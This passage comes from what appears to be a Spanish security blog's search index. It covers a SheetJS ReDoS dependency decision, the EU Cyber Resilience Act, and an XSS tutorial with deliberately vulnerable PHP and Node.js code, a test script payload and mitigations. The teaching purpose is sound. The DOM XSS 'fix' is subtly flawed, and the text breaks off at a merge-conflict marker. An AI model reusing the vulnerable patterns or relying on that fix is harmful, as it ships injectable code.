el original tardar\u00eda 4.980 segundos en procesarse, es decir, 100 veces m\u00e1s de retardo para un contenido diez veces mayor.</p> <p>En nuestro caso, las pruebas del PoC en nuestro entorno de desarrollo no mostraron ning\u00fan retardo perceptible, ya que nuestra aplicaci\u00f3n valida que el archivo sea una archivo XLS real antes de parsearlo. Esta validaci\u00f3n mitiga la explotabilidad de la vulnerabilidad en nuestra configuraci\u00f3n. Sin embargo, sigue siendo necesario abordar el problema, ya que hay m\u00e1s expresiones regulares codiciosas en la biblioteca.</p> <p>Se identificaron dos posibles soluciones:</p> <ul> <li>Detectar se\u00f1ales de explotaci\u00f3n antes de parsear el XLS.</li> <li>Actualizar la versi\u00f3n de SheetJS.</li> </ul> <p>La primera opci\u00f3n tiene inconvenientes. La comprobaci\u00f3n de patrones de explotaci\u00f3n mediante regex puede introducir inadvertidamente nuevas vulnerabilidades ReDos, y abordar todos los patrones regex problem\u00e1ticos a\u00f1ade una complejidad innecesaria.</p> <p>La segunda opci\u00f3n, aunque sencilla, se complica por el hecho de que el paquete ya no pertenece al ecosistema npm y debe de ser importado manualmente.</p> <p>Dadas estas consideraciones, nuestro equipo en Atlansec eligi\u00f3 la segunda opci\u00f3n y actualiz\u00f3 SheetJS para esta aplicaci\u00f3n.</p>","tags":["Ciberseguridad","Gesti\u00f3n de Dependencias","Gesti\u00f3n de Vulnerabilidades","Desarrollo","NodeJS","Parches","Revisi\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/19-01-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>La alerta de Dependabot sobre vulnerabilidades en SheetJS sirvi\u00f3 como recordatorio de la complejidad de la gesti\u00f3n de dependencias. Abordar estos problemas requiere m\u00e1s que una simple actualizaci\u00f3n con un clic. Para tomar una buena decisi\u00f3n, nos sumergimos a fondo en las vulnerabilidades, analizando su impacto en nuestra aplicaci\u00f3n y la viabilidad de las soluciones disponibles.</p> <p>Examinando de cerca las vulnerabilidades, Atlansec ha desarrollado estrategias de mitigaci\u00f3n in situ que satisfacen las necesidades de nuestra aplicaci\u00f3n. Como en la mayor\u00eda de proyectos, no se trata s\u00f3lo de corregir las alertas, sino de comprender sus implicaciones y tomar decisiones que equilibren las necesidades de seguridad y operativas. Para nosotros, fue un recordatorio de c\u00f3mo la vigilancia y la adaptabilidad pueden convertir los retos de dependencia en oportunidades para reforzar la postura de seguridad de nuestras aplicaciones. Y lo importante que es crear una postura de seguridad tanto en el desarrollo como en el mantenimiento de la aplicaci\u00f3n, no solo desde la perspectiva de una prueba de vulnerabilidad ocasional.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Gesti\u00f3n de Dependencias","Gesti\u00f3n de Vulnerabilidades","Desarrollo","NodeJS","Parches","Revisi\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/22-12-2024/","title":"Nueva Ley de Resiliencia Cibern\u00e9tica de la UE","text":"<p>El 23 de octubre de 2024, entr\u00f3 en vigor la Regulaci\u00f3n Europea de Resiliencia Cibern\u00e9tica, marcando un cambio regulatorio destinado a fortalecer la seguridad digital en toda la Uni\u00f3n Europea. En Atlansec, este hito refuerza nuestra misi\u00f3n principal: crear soluciones y productos digitales que sean seguros durante todo su ciclo de vida y garantizar la protecci\u00f3n de los entornos en los que operan.</p>","tags":["Ciberseguridad","Uni\u00f3n Europea","Linux","Cumplimiento"]},{"location":"es/blog/posts/22-12-2024/#que-implica-este-reglamento","title":"\u00bfQu\u00e9 implica este reglamento?","text":"<p>Este nuevo marco normativo establece requisitos claros y unificados para garantizar la ciberseguridad en el dise\u00f1o, desarrollo, fabricaci\u00f3n y comercializaci\u00f3n de productos digitales. Su objetivo es cerrar las brechas de seguridad existentes y ofrecer a los consumidores y a las empresas la confianza de que los productos que adquieren est\u00e1n dise\u00f1ados para ser seguros contra las amenazas actuales y futuras.</p>","tags":["Ciberseguridad","Uni\u00f3n Europea","Linux","Cumplimiento"]},{"location":"es/blog/posts/22-12-2024/#objetivos-claves-del-reglamento","title":"Objetivos Claves del Reglamento","text":"<ul> <li>Est\u00e1ndares de Ciberseguridad en toda Europa:   Se aplican a todos los productos conectados, directa o indirectamente a redes o dispositivos, evitando solapamientos entre distintas legislaciones de distintos Estados Miembros.</li> <li>Seguridad durante todo el Ciclo de Vida:   Los fabricantes deben implementar procesos de gesti\u00f3n de vulnerabilidades, evaluaciones de riesgos y emitir declaraciones de disconformidad.</li> <li>Mayor transparencia para los consumidores:   Facilitar la identificaci\u00f3n de productos seguros, ayudando a los usuarios a tomar decisiones informadas cuando compran hardware o software.</li> <li>Responsabilidad compartida a trav\u00e9s de la cadena de valor:   Los fabricantes, importadores y distribuidores deben garantizar el cumplimiento de estas medidas, mejorando la seguridad en todas las fases, desde el dise\u00f1o hasta el uso final.</li> </ul>","tags":["Ciberseguridad","Uni\u00f3n Europea","Linux","Cumplimiento"]},{"location":"es/blog/posts/22-12-2024/#aspectos-claves-del-nuevo-reglamento","title":"Aspectos Claves del Nuevo Reglamento","text":"<ul> <li>Cobertura Completa:   Todo producto digital est\u00e1 sujeto a la Regulaci\u00f3n, excepto aquellos que se rigen por otras normas (por ejemplo, dispositivos m\u00e9dicos, aeronaves y autom\u00f3viles).</li> <li>Gesti\u00f3n de Vulnerabilidades:   Los fabricantes deben de garantizar la seguridad de sus productos frente a nuevas amenazas futuras.</li> <li>Marco de vigilancia del mercado:   Supervisi\u00f3n reforzada para garantizar el cumplimiento de estas nuevas leyes y salvaguardar a los usuarios finales.</li> </ul> <p>En Atlansec, creemos firmemente que la ciberseguridad debe de ser la fundaci\u00f3n de todo lo que hacemos. Nuestro compromiso es garantizar que cada soluci\u00f3n, cada l\u00ednea de c\u00f3digo y cada producto que desarrollamos se dise\u00f1e teniendo en cuenta la seguridad, no solo en entornos digitales, sino tambi\u00e9n en los sistemas e infraestructura que los sustentan. As\u00ed es como generamos confianza en un mundo digital cada vez m\u00e1s complejo.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Uni\u00f3n Europea","Linux","Cumplimiento"]},{"location":"es/blog/posts/23-02-2025/","title":"Cross-Site Scripting: La Amenaza Invisible en tu Web","text":"<p>Las vulnerabilidades de Cross-Site Scripting (XSS) son un riesgo com\u00fan y peligroso en la seguridad de aplicaciones web y con impactos nefastos en aplicaciones m\u00f3viles y de escritorio. Permiten a atacantes inyectar c\u00f3digo JavaScript malicioso en contextos de confianza. </p> <p>En el caso de aplicaciones web permite inyectar c\u00f3digo JavaScript en sitios leg\u00edtimos y utilizarlos para robar informaci\u00f3n de otros usuarios, manipular el comportamiento de la p\u00e1gina o realizar acciones en la aplicaci\u00f3n dentro del contexto de la sesi\u00f3n del usuario. En el caso de aplicaciones de escritorio, puede llevar directamente a ejecuci\u00f3n de c\u00f3digo arbitrario en el equipo de la victima.</p> <p>Este art\u00edculo ofrece una visi\u00f3n detallada de los tres tipos principales de XSS: Stored XSS, Reflected XSS y DOM-Based XSS, explicando c\u00f3mo ocurren, c\u00f3mo se explotan y c\u00f3mo prevenirlas.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#para-que-se-usa","title":"\u00bfPara qu\u00e9 se usa?","text":"<p>Los ataques Cross-Site Scripting (XSS) pueden ser utilizados principalmente para:</p> <ul> <li>Robo de cookies de sesi\u00f3n: Permite a los atacantes suplantar la identidad de usuarios leg\u00edtimos y acceder a sus cuentas.</li> <li>Suplantaci\u00f3n de identidad: Los atacantes pueden realizar acciones no autorizadas en nombre de la v\u00edctima, como cambiar contrase\u00f1as o realizar transacciones fraudulentas.</li> <li>Phishing: Pueden crear p\u00e1ginas o formularios falsos para enga\u00f1ar a los usuarios y robar sus credenciales.</li> <li>Defacement: Modificar la apariencia de sitios web para mostrar contenido malicioso o da\u00f1ar la reputaci\u00f3n de la organizaci\u00f3n.</li> <li>Keylogging: Registrar las pulsaciones del teclado para robar contrase\u00f1as y otra informaci\u00f3n sensible.</li> <li>Ataques al navegador: Explotar vulnerabilidades en el navegador de la v\u00edctima para ejecutar c\u00f3digo malicioso.</li> <li>Bypass de controles de acceso: Eludir restricciones de seguridad como el env\u00edo de tokens CSRF (Cross-Site Request Forgery).</li> </ul>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#como-explotarlas","title":"\u00bfC\u00f3mo explotarlas?","text":"<p>Los atacantes suelen seguir estos pasos para explotar vulnerabilidades XSS:</p> <ol> <li>Identificaci\u00f3n de vulnerabilidades: Buscan puntos de entrada donde puedan inyectar c\u00f3digo JavaScript, como par\u00e1metros URL o campos de formularios.</li> <li>Creaci\u00f3n del payload: Desarrollan un script malicioso para realizar la acci\u00f3n deseada.</li> <li>Inyecci\u00f3n del payload: Insertan el c\u00f3digo malicioso en la aplicaci\u00f3n web, aprovechando la falta de sanitizaci\u00f3n.</li> <li>Entrega del ataque: <ul> <li>Para XSS reflejado: Enga\u00f1an a la v\u00edctima para que acceda a un enlace malicioso o env\u00ede un formulario manipulado.</li> <li>Para XSS almacenado: El ataque se activa autom\u00e1ticamente cuando los usuarios acceden a la p\u00e1gina comprometida.</li> </ul> </li> </ol>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#por-que-ocurre","title":"\u00bfPor qu\u00e9 ocurre?","text":"<p>Las vulnerabilidades XSS suelen ocurrir debido a:</p> <ul> <li>Mala sanitizaci\u00f3n del c\u00f3digo: No se validan adecuadamente los datos proporcionados por los usuarios ni se escapan los caracteres HTML especiales.</li> <li>Falta de codificaci\u00f3n: No se realiza una codificaci\u00f3n correcta al insertar datos en diferentes contextos (HTML, JavaScript, URL).</li> </ul> <p>Este tipo de vulnerabilidad no es inherente a un lenguaje de programaci\u00f3n concreto, en nuestro caso nos vamos a centrar en PHP y JavaScript en los ejemplos para facilitar la comprensi\u00f3n.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#stored-xss-la-bomba-de-tiempo-en-tu-base-de-datos","title":"Stored XSS: La Bomba de Tiempo en tu Base de Datos","text":"<p>Las Stored XSS, o XSS persistentes, ocurren cuando una aplicaci\u00f3n web almacena datos proporcionados por un atacante (que contienen c\u00f3digo malicioso) en su base de datos. Este c\u00f3digo se inserta en p\u00e1ginas web servidas a otros usuarios, afectando a todos los que visitan la p\u00e1gina comprometida. Foros, rese\u00f1as de productos y secciones de comentarios son los blancos m\u00e1s comunes.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#codigo-php-vulnerable-y-solucion","title":"C\u00f3digo PHP: vulnerable y soluci\u00f3n","text":"<p>En el siguiente ejemplo vemos dos vulnerabilidades, una inyeccion SQL y un punto de entrada para XSS. Para este post nos centraremos en la segunda, donde vemos que al realizar una petici\u00f3n POST (introducir datos), no se sanitiza la entrada de datos:</p> <pre><code>&lt;?php\n//Guarda los comentarios de los usuarios\n$comentario = $_POST['comentario'];\nmysqli_query($conn,\"INSERT INTO comentarios (comentario) VALUES ('$comentario')\");\n//Mostramos los comentarios\n$resultado = mysqli_query($conn, \"SELECT comentario FROM comentarios\");\nwhile($row = mysqli_fetch_assoc($resultado)){\n  echo $row['comentario'];\n}\n?&gt;\n</code></pre> <p>La variable <code>$comentario</code> almacena el input del usuario sin sanitizarla previamente, esto da una ventana al atacante para introducir cualquier payload.</p> <p>Al mostrar los comentarios, el payload ser\u00e1 interpretado en el contexto del navegador de la victima que visite la web.</p> <p>Una posible mitigaci\u00f3n es la siguiente: <pre><code>&lt;?php\n// Conexi\u00f3n a la base de datos (ajusta las credenciales)\n$conn = new mysqli(\"localhost\", \"usuario\", \"contrase\u00f1a\", \"basedatos\");\n\n// Verifica la conexi\u00f3n\nif ($conn-&gt;connect_error) {\n    die(\"Error de conexi\u00f3n: \" . $conn-&gt;connect_error);\n}\n\n// Verifica si se ha enviado un comentario\nif ($_SERVER[\"REQUEST_METHOD\"] === \"POST\" &amp;&amp; isset($_POST['comentario'])) {\n    // Eliminamos espacios en blanco al inicio y al final\n    $comentario = trim($_POST['comentario']); \n\n    // Evitar SQL Injection con prepared statements\n    $stmt = $conn-&gt;prepare(\"INSERT INTO comentarios (comentario) VALUES (?)\");\n    $stmt-&gt;bind_param(\"s\", $comentario);\n    $stmt-&gt;execute();\n    $stmt-&gt;close();\n}\n\n// Mostramos los comentarios de forma segura\n$resultado = $conn-&gt;query(\"SELECT comentario FROM comentarios\");\nwhile ($row = $resultado-&gt;fetch_assoc()) {\n    echo htmlspecialchars($row['comentario'], ENT_QUOTES, 'UTF-8') . \"&lt;br&gt;\";\n}\n\n// Cerramos la conexi\u00f3n\n$conn-&gt;close();\n?&gt;\n</code></pre></p> <p>Aunque no es el kit de este post, se ha protegido la inserci\u00f3n de datos utilizando Prepared Statements en PHP, y la salida de los comentarios mediante <code>htmlspecialchars</code>.</p> <ul> <li>Prepared Statements: Evitan SQL Injection al separar los datos de la consulta SQL, asegurando que el input del usuario se trate como un valor y no como parte del c\u00f3digo SQL.</li> <li><code>htmlspecialchars</code>: Asegura que todos los caracteres especiales se convierten a sus correspondientes entidades HTML, evitando ataques XSS.</li> </ul> <p>Danger</p> <p>No hacemos uso de <code>mysqli_real_escape_string</code> debido a que NO protege contra SQL Injection por s\u00ed solo, ya que depende de la configuraci\u00f3n de <code>set_charset()</code>. Si consultamos la documentaci\u00f3n oficial veremos que nos advierte de que si la codificaci\u00f3n no se establece correctamente, el escape de caracteres especiales puede no funcionar como se espera, permitiendo ataques de inyecci\u00f3n en algunas configuraciones.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#codigo-javascript-vulnerabilidad-y-solucion","title":"C\u00f3digo JavaScript: Vulnerabilidad y soluci\u00f3n","text":"<p>Existen m\u00faltiples frameworks para implementar un backend con JavaScript, pero la sintaxis es similar en todos ellos. El siguiente ejemplo en Node.js ilustra una vulnerabilidad de Cross-Site Scripting (XSS) en la generaci\u00f3n de contenido din\u00e1mico:</p> <pre><code>app.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for (const comentario of comments) {\n    html += `&lt;li&gt;${comentario}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> <p>Este c\u00f3digo lista los comentarios en la secci\u00f3n \"comments\" de la aplicaci\u00f3n, pero no escapa los caracteres especiales en la variable <code>${comentario}</code>, permitiendo inyectar HTML y ejecutar c\u00f3digo JavaScript arbitrario.</p> <p>Para prevenir ataques XSS, se deben sanear los caracteres especiales antes de renderizar el contenido en el frontend. Por tanto, este c\u00f3digo se puede mejorar saneando los caracteres especiales mediante funciones como <code>sanitizeHtml()</code>:</p> <pre><code>const sanitizeHtml = require('sanitize-html');\napp.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for(const comentario of comments){\n    const ComentarioSaneado = sanitizeHtml(comentario);\n    html += `&lt;li&gt;${ComentarioSaneado}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> <p>Warning</p> <p>Podemos utilizar diversas bibliotecas como <code>DOMPurify</code>, <code>sanitize-html</code> o <code>isomorphic-dompurify</code> para parchear vulnerabilidades XSS, dependiendo de si estamos trabajando en el frontend o backend.</p> <ul> <li><code>DOMPurify</code>: Purifica el HTML en aplicaciones frontend, eliminando c\u00f3digo malicioso.</li> <li><code>sanitize-html</code>: Ideal para el backend, sanitiza el HTML eliminando etiquetas y atributos peligrosos.</li> <li><code>isomorphic-dompurify</code>: Versi\u00f3n de DOMPurify que funciona tanto en el frontend como en el backend.</li> </ul> <p>En el ejemplo anterior, utilizamos <code>sanitize-html</code> porque estamos trabajando en un entorno Node.js.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#reflected-xss-el-ataque-oportunista","title":"Reflected XSS: El Ataque Oportunista","text":"<p>Al contrario que en el caso de las Stored XSS, las Reflected XSS ocurren solo en el lado del cliente. Estas vulnerabilidades a menudo surgen en la manipulaci\u00f3n de URLs o de formularios , en estos casos el atacante debe valerse de m\u00e9todos de ingeniera social o de cadenas de vulnerabilidades para conseguir hacer llegar el payload al contexto de la victima.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#codigo-php-vulnerable-y-solucion_1","title":"C\u00f3digo PHP vulnerable y soluci\u00f3n","text":"<p>En este caso esta vulnerabilidad existe por no sanitizar el par\u00e1metro query previamente a introducirlo en el HTML a renderizar: <pre><code>&lt;?php\n$search_query = $_GET['query'];\necho \"&lt;p&gt;Has buscado: $search_query&lt;/p&gt;\";\n?&gt;\n</code></pre></p> <p>Si tenemos la siguiente URL <code>http://url/search?query=resultado_busqueda</code>, y sustituimos <code>resultado_busqueda</code> por <code>&lt;script&gt;alert(\"Hola\");&lt;/script&gt;</code>, el script inyectado ser\u00e1 reflejado en la p\u00e1gina, ya que no se est\u00e1n saneando las entidades HTML. La soluci\u00f3n podr\u00eda pasar de nuevo por el uso de <code>htmlspecialchars</code>.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#codigo-javascript-vulnerable-y-solucion","title":"C\u00f3digo JavaScript vulnerable y soluci\u00f3n","text":"<p>Al igual que para las Stored XSS, usaremos un ejemplo de aplicaci\u00f3n web implementada con el framework Node.js.</p> <p>Esta aplicaci\u00f3n tiene el siguiente fragmento de c\u00f3digo:</p> <pre><code>const express = require('express');\nconst app = express();\n\napp.get('/search', function(req, res){\n  var searchTerm = req.query.query;\n  res.send('Has buscado: ' + searchTerm);\n});\n\napp.listen(80);\n</code></pre> <p>Vemos que se obtiene el contenido de la variable <code>query</code> que aparece en la URL <code>http://url/search?query=resultado_busqueda</code>. Esta entrada de datos no tiene ning\u00fan saneamiento llevando a una vulnerabilidad de Reflected XSS. Igual que para el caso del Stored XSS podemos solucionarlo con librer\u00edas como <code>sanitize-html</code> o <code>DomPurify</code>.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#dom-based-xss-el-peligro-invisible-en-el-cliente","title":"DOM-Based XSS: El Peligro Invisible en el Cliente","text":"<p>El DOM-Based XSS es una vulnerabilidad de seguridad web que se produce en el lado del cliente, la diferencia con los reflected es xss es que estas se ejecutan sin necesidad de que el servidor refleje el payload del ataque directamente en la respuesta. Esto se consigue manipulando el Document Object Model (DOM) en el navegador del usuario mediante diversas t\u00e9cnicas.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#que-es-el-dom","title":"\u00bfQu\u00e9 es el DOM?","text":"<p>El DOM (Document Object Model) es una interfaz de programaci\u00f3n que representa un documento web como una estructura de \u00e1rbol. Los sitios web pueden hacer uso de JavaScript para acceder y modificar din\u00e1micamente el contenido, la estructura y el estilo de un documento web.</p> <p>La estructura del DOM se compone de:</p> <ul> <li>Elementos HTML (nodos)</li> <li>Atributos de elementos</li> <li>Texto dentro de los elementos</li> <li>Comentarios</li> </ul> Estructura del DOM","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#metodologia-del-ataque-dom-based-xss","title":"Metodolog\u00eda del Ataque DOM-Based XSS","text":"<p>El atacante inyecta un script malicioso que se ejecuta en el navegador del cliente manipulando el DOM. El proceso general es:</p> <ol> <li>Identificaci\u00f3n de la Vulnerabilidad: El atacante encuentra un punto en el c\u00f3digo JavaScript del lado del cliente donde los datos controlados por el atacante (por ejemplo, par\u00e1metros de la URL) se utilizan para modificar el DOM de manera insegura. Esto implica identificar tanto la fuente de los datos (donde entran los datos controlados por el atacante) como el sink (donde los datos se usan de forma peligrosa para manipular el DOM).</li> <li>Creaci\u00f3n de la URL Maliciosa: Se crea una URL que contiene c\u00f3digo JavaScript malicioso, t\u00edpicamente como parte de un par\u00e1metro o fragmento de la URL. El payload se coloca en una fuente de datos controlable por el atacante.</li> <li>Enga\u00f1o a la V\u00edctima: La v\u00edctima es enga\u00f1ada para que acceda a la URL maliciosa a trav\u00e9s de phishing, enlaces acortados, etc.</li> <li>Ejecuci\u00f3n en el Navegador: El navegador de la v\u00edctima carga la p\u00e1gina y ejecuta el c\u00f3digo JavaScript leg\u00edtimo de la aplicaci\u00f3n.</li> <li>Manipulaci\u00f3n del DOM: El c\u00f3digo leg\u00edtimo, al usar datos de la URL maliciosa, modifica el DOM, insertando el script malicioso. La clave es que el sink recibe datos contaminados de la fuente y los utiliza para modificar el DOM de forma insegura.</li> <li>Ejecuci\u00f3n del Script Malicioso: El script inyectado se ejecuta en el contexto de la p\u00e1gina web, permitiendo al atacante realizar acciones como robo de cookies, manipulaci\u00f3n de la p\u00e1gina, redirecciones, o incluso la exfiltraci\u00f3n de datos sensibles.</li> </ol> <p>Existen otros flujos de ataque, pero este es el mas com\u00fan y sencillo de ilustrar para la explicaci\u00f3n.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#fuentes-comunes-de-dom-xss","title":"Fuentes Comunes de DOM XSS","text":"<p>Las fuentes de datos m\u00e1s comunes incluyen:</p> <ol> <li> <p><code>window.location</code>: Este objeto contiene la informaci\u00f3n sobre la URL actual del documento. Es muy \u00fatil para obtener diferentes partes de la URL.</p> <ul> <li><code>window.location.hash</code>: Devuelve el fragmento de la URL (la parte despu\u00e9s del <code>#</code>), que a menudo se usa para la navegaci\u00f3n en una sola p\u00e1gina.</li> <li><code>window.location.search</code>: Devuelve la cadena de consulta de la URL (la parte despu\u00e9s del <code>?</code>), que contiene par\u00e1metros que pueden ser utilizados por el servidor o el cliente.</li> <li><code>window.location.pathname</code>: Devuelve la ruta de acceso de la URL (la parte despu\u00e9s del dominio), que indica la ubicaci\u00f3n del recurso en el servidor.</li> </ul> </li> <li> <p><code>document.referrer</code>: Este atributo devuelve la URL de la p\u00e1gina desde la cual el usuario lleg\u00f3 a la p\u00e1gina actual. Es \u00fatil para rastrear de d\u00f3nde provienen los visitantes.</p> </li> <li> <p><code>document.URL</code>: Devuelve la URL completa de la p\u00e1gina actual. Es similar a <code>window.location.href</code> y puede ser usado para obtener la URL completa en una sola llamada.</p> </li> <li> <p>Cookies: Las cookies son peque\u00f1os fragmentos de datos almacenados en el navegador del usuario. Se utilizan para recordar informaci\u00f3n entre sesiones, como datos de autenticaci\u00f3n, preferencias del usuario, y m\u00e1s. En JavaScript, se pueden acceder y manipular usando <code>document.cookie</code>.</p> </li> </ol> <p>Como podemos ver, estos puntos de entrada son comunes en el desarrollo web y se utilizan con normalidad para obtener informaci\u00f3n sobre la navegaci\u00f3n del usuario y el estado de la aplicaci\u00f3n.</p> <p>Recordatorio</p> <p>Todas estas fuentes son controlables por el atacante en determinadas circunstancias.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#sinks-comunes-de-dom-xss","title":"Sinks Comunes de DOM XSS","text":"<p>Las sinks son funciones u objetos DOM potencialmente peligrosos en JavaScript que pueden causar efectos no deseados si se les pasa datos controlados por un atacante Seg\u00fan PortSwigger, algunos de los sinks m\u00e1s comunes que conducen a DOM XSS incluyen:</p> <ul> <li><code>document.write()</code>: Escribe texto HTML directamente en el documento. Se usa principalmente durante la carga de la p\u00e1gina.</li> <li><code>document.writeln()</code>: Similar a <code>document.write()</code>, pero a\u00f1ade una nueva l\u00ednea despu\u00e9s del texto.</li> <li><code>document.domain</code>: Propiedad que devuelve o establece el dominio de la p\u00e1gina actual.</li> <li><code>element.innerHTML</code>: Propiedad que establece o devuelve el contenido HTML de un elemento.</li> <li><code>element.outerHTML</code>: Propiedad que establece o devuelve el HTML completo del elemento, incluyendo el propio elemento.</li> <li><code>element.insertAdjacentHTML()</code>: M\u00e9todo que inserta un texto HTML en una posici\u00f3n espec\u00edfica relativa al elemento.</li> <li><code>element.onevent</code>: (ej., <code>onclick</code>, <code>onload</code>): Propiedades que asignan funciones a eventos espec\u00edficos del elemento.</li> <li><code>eval()</code>: Funci\u00f3n que eval\u00faa c\u00f3digo JavaScript representado como una cadena de texto.</li> </ul> <p>Tambi\u00e9n, ciertas funciones de jQuery pueden ser problem\u00e1ticas:</p> <ul> <li><code>add()</code>, <code>after()</code>, <code>append()</code>, <code>animate()</code>, <code>before()</code>, <code>html()</code>, <code>prepend()</code>, <code>replaceAll()</code>, <code>replaceWith()</code>, <code>wrap()</code>, <code>wrapInner()</code>, <code>wrapAll()</code>.</li> <li><code>attr()</code> (si se usa con datos no saneados)</li> <li><code>$()</code> (selector, especialmente con location.hash)</li> </ul> <p>Recordatorio</p> <p>Es crucial tener en cuenta que no es suficiente que una fuente y un sink est\u00e9n presentes en el c\u00f3digo. Debe haber un flujo de datos ejecutable desde la fuente al sink para que la vulnerabilidad sea explotable.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#codigo-vulnerable-y-solucion","title":"C\u00f3digo Vulnerable y Soluci\u00f3n","text":"<p>Para ilustrar esta vulnerabilidad traemos el siguiente ejemplo, imagina que tenemos acceso a la siguiente web:</p> Web inicial <p>A simple vista no vemos nada relevante, pero si inspeccionamos el c\u00f3digo fuente de la misma veremos lo siguiente:</p> <p><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n     &lt;title&gt;Web Vulnerable&lt;/title&gt;\n     &lt;/head&gt; \n  &lt;body&gt;\n    &lt;div id=\"saludo\"&gt;&lt;/div&gt;\n    &lt;script&gt; \n      //Obtenemos el par\u00e1metro nombre de la URL\n      const nombre = new URLSearchParams(window.location.search).get('nombre');\n      if(nombre == null){\n        document.write(\"Hola, \u00bfC\u00f3mo te llamas?\");\n      }else{\n        //Mostramos los resultados de manera no sanitizada\n        document.write(\"Hola \" + nombre + \", \u00bfQu\u00e9 tal?\");\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Aqu\u00ed, <code>window.location.search</code> es la fuente y <code>document.write()</code> es el sink.</p> <p>Como podemos ver, la p\u00e1gina web est\u00e1 utilizando la funci\u00f3n <code>document.write()</code>, que inserta el par\u00e1metro <code>nombre</code> sin validaci\u00f3n o sanitizaci\u00f3n previa. As\u00ed, dado que por defecto ese par\u00e1metro es nulo, vemos que la web nos muestra lo que est\u00e1 contenido en la declaraci\u00f3n del <code>if</code>; sin embargo, si pasamos un nombre como par\u00e1metro en la URL, tenemos:</p> Web URL modificada <p>Como resultado tenemos que el nombre que se introduce como par\u00e1metro a la URL se refleja en la p\u00e1gina web. Como el input del nombre de usuario no est\u00e1 sanitizado podemos intentar inyectar c\u00f3digo JavaScript con el fin de comprobar si la web es susceptible a XSS; Spoiler: Lo es.</p> Web vulnerable a DOM-Based XSS <p>Como vemos, el script se ejecut\u00f3 y mostr\u00f3 la alerta, ya que es susceptible a XSS. Una manera de poder subsanar esta vulnerabilidad ser\u00eda:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n     &lt;title&gt;Web Vulnerable&lt;/title&gt;\n     &lt;/head&gt; \n  &lt;body&gt;\n    &lt;div id=\"saludo\"&gt;&lt;/div&gt;\n    &lt;script&gt; \n      //Obtenemos el par\u00e1metro nombre de la URL\n      const nombre = encodeURIComponent(new URLSearchParams(window.location.search).get('nombre'));\n      if(nombre == null){\n        document.write(\"Hola, \u00bfC\u00f3mo te llamas?\");\n      }else{\n        //Mostramos los resultados de manera no sanitizada\n        document.write(\"Hola \" + nombre + \", \u00bfQu\u00e9 tal?\");\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Si ahora volvemos a inyectar c\u00f3digo JavaScript malicioso, tendremos el siguiente resultado:</p> Web no vulnerable a DOM-Based XSS <p>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:docs/es/blog/posts/23-02-2025.md Como vemos, si hacemos uso del m\u00e9todo <code>encodeURIComponent</code> 